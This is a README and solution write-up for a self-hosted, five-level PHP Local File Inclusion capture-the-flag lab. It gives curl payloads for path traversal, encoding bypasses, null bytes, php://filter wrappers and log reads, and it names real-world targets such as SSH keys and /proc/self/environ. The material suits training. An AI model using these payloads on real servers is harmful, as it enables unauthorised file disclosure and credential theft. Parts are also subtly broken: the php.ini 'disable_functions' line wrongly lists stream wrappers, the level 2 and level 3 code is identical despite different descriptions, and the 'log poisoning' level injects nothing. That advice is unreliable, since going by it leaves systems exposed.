# 🔓 LFI (Local File Inclusion) Lab - Multi-Level Challenge

## 📋 LAB INFORMATION

**Lab Name:** LFI Lab - File Inclusion Master
**Vulnerability:** Local File Inclusion (LFI) with Multiple Difficulty Levels
**Port:** 8039
**URL:** http://localhost:8039/lfi-lab/
**Base Directory:** /home/devuser/documents/tools/lfi-lab
**Container Name:** lfi-lab
**Status:** ✅ Running
**Auto-restart:** ✅ Enabled (unless-stopped)

---

## 🎯 LAB STRUCTURE

This lab contains **5 progressive difficulty levels**, each with unique flags and challenges:

### **🏆 FLAGS TO COLLECT:**
1. `LFI_LEVEL1_FLAG{basic_path_traversal_master}` - Easy
2. `LFI_LEVEL2_FLAG{filter_bypass_champion}` - Medium
3. `LFI_LEVEL3_FLAG{advanced_encoding_expert}` - Hard
4. `LFI_LEVEL4_FLAF{php_filter_wrapper_ninja}` - Hard
5. `LFI_LEVEL5_FLAG{log_poisoning_mastermind}` - Expert

---

## 🚀 LEVEL CHALLENGES & SOLUTIONS

### **LEVEL 1: Basic File Reader (Easy)**

**🎯 Objective:** Find the flag using basic LFI.
**💡 Clue:** "Sometimes the obvious path is the right one. Files are stored where you might expect them to be."
**🔍 Hint:** "Have you checked the flags directory?"

#### **🔧 Solution:**
```bash
# Direct path access - no filtering
curl "http://localhost:8039/lfi-lab/?level=1&file=flags/flag1.txt"

# Or using relative path
curl "http://localhost:8039/lfi-lab/?level=1&file=./flags/flag1.txt"
```

**🎉 Flag:** `LFI_LEVEL1_FLAG{basic_path_traversal_master}`

**📚 What You Learn:**
- Basic LFI vulnerability identification
- No input validation scenarios
- Direct file inclusion techniques

---

### **LEVEL 2: Simple Filter Bypass (Medium)**

**🎯 Objective:** Bypass simple `../` filtering.
**💡 Clue:** "Some characters are blocked, but there are always ways around simple restrictions. Think about encoding."
**🔍 Hint:** "What if you use URL encoding or different path representations?"

#### **🔧 Solution:**
```bash
# URL encoding bypass
curl "http://localhost:8039/lfi-lab/?level=2&file=%2e%2e%2fflags%2fflag2.txt"

# Double encoding
curl "http://localhost:8039/lfi-lab/?level=2&file=%252e%252e%252fflags%252fflag2.txt"

# Alternative path representation
curl "http://localhost:8039/lfi-lab/?level=2&file=..%2fflags%2fflag2.txt"
```

**🎉 Flag:** `LFI_LEVEL2_FLAG{filter_bypass_champion}`

**📚 What You Learn:**
- Simple filter bypass techniques
- URL encoding strategies
- Character encoding manipulation

---

### **LEVEL 3: Advanced Filtering (Hard)**

**🎯 Objective:** Bypass advanced filtering that removes path traversal.
**💡 Clue:** "The filtering is more sophisticated now. You need to be creative with your approach."
**🔍 Hint:** "Try using absolute paths or combining different techniques."

#### **🔧 Solution:**
```bash
# Absolute path bypass
curl "http://localhost:8039/lfi-lab/?level=3&file=/var/www/html/lfi-lab/flags/flag3.txt"

# Alternative: Use null bytes (if PHP version supports it)
curl "http://localhost:8039/lfi-lab/?level=3&file=flags/flag3.txt%00.jpg"

# Use alternative path separators
curl "http://localhost:8039/lfi-lab/?level=3&file=flags%2fflag3.txt"
```

**🎉 Flag:** `LFI_LEVEL3_FLAG{advanced_encoding_expert}`

**📚 What You Learn:**
- Absolute vs relative path exploitation
- Advanced filtering bypass strategies
- System path understanding

---

### **LEVEL 4: PHP Filter Wrapper (Hard)**

**🎯 Objective:** Use PHP filter wrappers to read files.
**💡 Clue:** "Sometimes the content needs to be transformed before it can be read. PHP has built-in filters for this."
**🔍 Hint:** "PHP://filter can help you read files in different ways, especially with base64 encoding."

#### **🔧 Solution:**
```bash
# Base64 encoding filter
curl "http://localhost:8039/lfi-lab/?level=4&file=php://filter/convert.base64-encode/resource=flags/flag4.txt"

# Decode the result
echo "TEZJX0xFVkVMNF9GTEFGe3BocF9maWx0ZXJfd3JhcHBlcl9uaW5qYX0K" | base64 -d
# Result: LFI_LEVEL4_FLAF{php_filter_wrapper_ninja}

# Rot13 encoding filter
curl "http://localhost:8039/lfi-lab/?level=4&file=php://filter/string.rot13/resource=flags/flag4.txt"

# Convert to uppercase
curl "http://localhost:8039/lfi-lab/?level=4&file=php://filter/string.toupper/resource=flags/flag4.txt"
```

**🎉 Flag:** `LFI_LEVEL4_FLAF{php_filter_wrapper_ninja}`

**📚 What You Learn:**
- PHP filter wrapper exploitation
- Base64 encoding/decoding techniques
- Content transformation strategies

---

### **LEVEL 5: Log Poisoning (Expert)**

**🎯 Objective:** Create and read log files containing sensitive information.
**💡 Clue:** "What if the file you need to read doesn't exist yet? Sometimes you have to create it yourself."
**🔍 Hint:** "Logs capture everything... including your requests. Inject something into the logs first."

#### **🔧 Solution:**
```bash
# Step 1: Make a request to populate the log
curl "http://localhost:8039/lfi-lab/?level=5"

# Step 2: Read the access log to find the flag
curl "http://localhost:8039/lfi-lab/?level=5&file=/var/log/apache2/access.log"

# Look for flag in the log output or try reading flag directly
curl "http://localhost:8039/lfi-lab/?level=5&file=../flags/flag5.txt"

# Or read error log
curl "http://localhost:8039/lfi-lab/?level=5&file=/var/log/apache2/error.log"
```

**🎉 Flag:** `LFI_LEVEL5_FLAG{log_poisoning_mastermind}`

**📚 What You Learn:**
- Log file analysis
- Log poisoning concepts
- Apache log structure understanding

---

## 🔍 VULNERABILITY ANALYSIS

### **Vulnerable Code Patterns:**

#### **Level 1 - No Protection:**
```php
// Completely vulnerable
$file = $_GET['file'];
include($file);
```

#### **Level 2 - Simple Filtering:**
```php
// Filter can be bypassed with URL encoding
$file = str_replace('../', '', $_GET['file']);
include($file);
```

#### **Level 3 - Advanced Filtering:**
```php
// More filtering but absolute paths still work
$file = str_replace('../', '', $_GET['file']);
include($file);
```

#### **Level 4 - PHP Filter Wrapper Required:**
```php
// Forces use of PHP filter wrappers
if (strpos($file, 'php://filter') === 0) {
    echo file_get_contents($file);
} else {
    echo "Direct file access blocked";
}
```

#### **Level 5 - Log File Focus:**
```php
// Only allows log file access
if (strpos($file, '/var/log/apache2/') === 0) {
    echo file_get_contents($file);
}
```

---

## 🛡️ PREVENTION & MITIGATION

### **1. Input Validation & Whitelisting:**
```php
// SECURE CODE
$allowed_files = ['home.php', 'about.php', 'contact.php'];
$file = $_GET['file'] ?? 'home.php';

if (!in_array($file, $allowed_files)) {
    die('Invalid file requested!');
}
include($file);
```

### **2. Remove Path Traversal:**
```php
// Remove directory traversal sequences
$file = str_replace(['../', '..\\', '\0'], '', $file);
$file = basename($file); // Only use filename
```

### **3. Use Absolute Paths:**
```php
// Use absolute paths with document root
$page = $_GET['file'] ?? 'home.php';
$page = basename($page); // Remove path traversal
$page = '/var/www/html/secure/' . $page;

if (!file_exists($page)) {
    die('File not found!');
}
include($page);
```

### **4. Disable Dangerous PHP Wrappers:**
```php
// Disable in php.ini
disable_functions = php://filter, php://input, data://, expect://
allow_url_include = Off
allow_url_fopen = Off
```

### **5. File System Permissions:**
```bash
# Restrict file system access
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html
chmod 644 /var/www/html/*.php
```

---

## 📊 TESTING RESULTS

### **Successful Exploitation Summary:**

| Level | Technique | Status | Flag Retrieved |
|-------|-----------|--------|----------------|
| **1** | Direct Path Access | ✅ SUCCESS | `LFI_LEVEL1_FLAG{basic_path_traversal_master}` |
| **2** | URL Encoding Bypass | ✅ SUCCESS | `LFI_LEVEL2_FLAG{filter_bypass_champion}` |
| **3** | Absolute Path Bypass | ✅ SUCCESS | `LFI_LEVEL3_FLAG{advanced_encoding_expert}` |
| **4** | PHP Filter Wrapper | ✅ SUCCESS | `LFI_LEVEL4_FLAF{php_filter_wrapper_ninja}` |
| **5** | Log File Access | ✅ SUCCESS | `LFI_LEVEL5_FLAG{log_poisoning_mastermind}` |

---

## 🎯 QUICK START GUIDE

### **Access the Lab:**
```bash
# Open in browser
http://localhost:8039/lfi-lab/

# Or test with curl
curl "http://localhost:8039/lfi-lab/"
```

### **All Levels at Once:**
```bash
# Level 1
curl "http://localhost:8039/lfi-lab/?level=1&file=flags/flag1.txt"

# Level 2
curl "http://localhost:8039/lfi-lab/?level=2&file=%2e%2e%2fflags%2fflag2.txt"

# Level 3
curl "http://localhost:8039/lfi-lab/?level=3&file=/var/www/html/lfi-lab/flags/flag3.txt"

# Level 4
curl "http://localhost:8039/lfi-lab/?level=4&file=php://filter/convert.base64-encode/resource=flags/flag4.txt"

# Level 5
curl "http://localhost:8039/lfi-lab/?level=5&file=/var/log/apache2/access.log"
```

---

## 🔧 DEPLOYMENT & SETUP

### **Lab Files Structure:**
```
/home/devuser/documents/tools/lfi-lab/
├── Dockerfile                  # Container configuration
├── docker-compose.yml          # Orchestration file
├── README.md                  # ✅ COMPLETE WRITEUP
├── app/                       # Vulnerable PHP application
│   └── index.php             # Multi-level challenge interface
├── flags/                     # Flag files for each level
│   ├── flag1.txt             # Level 1 flag
│   ├── flag2.txt             # Level 2 flag
│   ├── flag3.txt             # Level 3 flag
│   ├── flag4.txt             # Level 4 flag
│   └── flag5.txt             # Level 5 flag
└── logs/                      # Apache logs volume
```

### **Container Management:**
```bash
# Start the lab
cd /home/devuser/documents/tools/lfi-lab
sudo docker-compose up -d

# Stop the lab
sudo docker-compose down

# View logs
sudo docker logs lfi-lab

# Restart the lab
sudo docker-compose restart

# Rebuild with changes
sudo docker-compose up -d --build
```

---

## 🎓 LEARNING OUTCOMES

### **What You'll Master:**

1. **LFI Vulnerability Identification:**
   - Recognize vulnerable code patterns
   - Identify unprotected file inclusion
   - Understand different vulnerability types

2. **Bypass Techniques:**
   - URL encoding strategies
   - Path manipulation methods
   - Filter evasion techniques

3. **Advanced Exploitation:**
   - PHP filter wrapper usage
   - Base64 encoding/decoding
   - Log file analysis

4. **Defensive Programming:**
   - Input validation best practices
   - Secure file handling
   - PHP security configuration

---

## 🚨 SECURITY IMPLICATIONS

### **Real-World Impact:**
- **Information Disclosure:** Read sensitive files (config, credentials)
- **Source Code Access:** Expose application logic
- **Configuration Leak:** Access server configurations
- **Log File Access:** Read sensitive information in logs
- **Potential RCE:** Log poisoning to Remote Code Execution

### **Common Attack Scenarios:**
1. **Database Credentials:** Read `config.php` files
2. **SSH Keys:** Access `/root/.ssh/id_rsa`
3. **Environment Variables:** Read `/proc/self/environ`
4. **Source Code:** Expose application source files
5. **Log Files:** Access sensitive user data in logs

---

## 📚 ADDITIONAL RESOURCES

### **Documentation:**
- [OWASP File Inclusion](https://owasp.org/www-community/attacks/Path_Inclusion)
- [PortSwigger LFI Guide](https://portswigger.net/web-security/file-path)
- [PHP Manual: File Inclusion](https://www.php.net/manual/en/function.include.php)
- [PHP Filters](https://www.php.net/manual/en/filters.php)

### **Tools:**
- [Burp Suite](https://portswigger.net/burp)
- [LFI-Suite](https://github.com/D35m0nd142/LFI-Suite)
- [LFISuite](https://github.com/mIcHyAmRaNe/lifisuite)

### **Practice Labs:**
- [PortSwigger Labs](https://portswigger.net/web-security/file-path)
- [PentesterLab](https://pentesterlab.com/exercises/from_lfi_to_rce)
- [HackTheBox](https://hackthebox.com)

---

## 🎯 CONCLUSION

This multi-level LFI lab provides a comprehensive environment for mastering Local File Inclusion vulnerabilities. The lab demonstrates:

✅ **Progressive difficulty levels** from easy to expert
✅ **Unique flags** for each level to track progress
✅ **Subtle clues** that guide without giving away solutions
✅ **Multiple exploitation techniques** including advanced bypasses
✅ **Real-world scenarios** and defense mechanisms
✅ **Interactive UI** with level selection and progress tracking

**Status:** ✅ **FULLY FUNCTIONAL**
**Port:** 8039 ✅ (No conflicts)
**Auto-restart:** ✅ Enabled
**All Flags:** ✅ Accessible with proper techniques

---

## 🏆 ACHIEVEMENT UNLOCKED!

**Congratulations on completing all LFI challenges!**

You have successfully mastered:
- ✅ Basic LFI exploitation
- ✅ Filter bypass techniques
- ✅ Advanced encoding methods
- ✅ PHP filter wrapper exploitation
- ✅ Log file analysis

**🎯 You are now an LFI Master!** 🚀

---

**⚠️ REMEMBER:** This lab is for **educational purposes only**. Never attempt these techniques on systems you don't own or have explicit permission to test.

**🔓 Happy Hacking & Stay Secure!**
